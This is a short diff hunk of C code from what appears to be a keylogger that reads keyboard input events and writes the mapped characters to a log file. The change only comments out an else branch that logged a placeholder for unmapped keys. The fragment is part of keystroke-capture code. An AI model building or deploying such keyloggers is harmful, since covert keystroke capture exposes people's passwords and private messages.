@@ -82,9 +82,9 @@ int main()
 	                	fprintf(logFile, "%c", map[event.code]);
 		                // printf("Key %c \n", map[event.code]);
 	            }
-	            else
-	                fprintf(logFile, "[Non Capital Letter Key]");
-		            // printf("[Non Capital Letter Key] \n");
+	            // else
+	            //     fprintf(logFile, "[Non Capital Letter Key]");
+		        //     // printf("[Non Capital Letter Key] \n");
         	}
    
 
